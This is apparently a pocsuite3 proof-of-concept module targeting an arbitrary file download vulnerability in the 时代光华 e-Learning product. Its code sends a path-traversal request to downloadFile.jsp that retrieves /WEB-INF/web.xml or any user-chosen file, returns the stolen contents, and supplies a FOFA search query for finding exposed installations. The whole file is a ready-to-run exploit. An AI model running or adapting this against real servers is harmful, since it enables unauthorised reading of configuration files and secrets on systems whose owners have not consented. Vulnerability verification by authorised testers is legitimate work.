"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
import re, base64
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text

class DemoPOC(POCBase):
    vulID = '1'  
    author = ['PeiQi']
    name = '时代光华 e-Learning downloadFile.jsp 任意文件下载漏洞'
    vulType = VUL_TYPE.PATH_DISCLOSURE
    desc = '''时代光华 e-Learning downloadFile.jsp存在任意文件下载漏洞，通过漏洞攻击者可以获取服务器上的任意文件，查看敏感信息
    '''
    appPowerLink = '时代光华'
    appName = '时代光华 e-Learning'
    appVersion = '未知版本'
    fofa_dork = {'fofa': 'app="时代光华-e-Learning"'} 
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["filename"] = OptString("/WEB-INF/web.xml", description='文件读取自定义命令')
        return o

    def _verify(self):
        result = {}
        url = self.url.rstrip('/') + "/fileServer/fileUpload/downloadFile.jsp?filePath=" + self.get_option("filename")
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if '<?xml' in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['File'] = self.get_option("filename")
                result['VerifyInfo']['Response'] = resp.text
        except Exception as ex:
            pass

        return self.parse_output(result)
    
    def _attack(self):
        result = {}
        url = self.url.rstrip('/') + "/fileServer/fileUpload/downloadFile.jsp?filePath=" + self.get_option("filename")
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if '<?xml' in resp.text and resp.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['File'] = self.get_option("filename")
                result['VerifyInfo']['Response'] = resp.text
        except Exception as ex:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)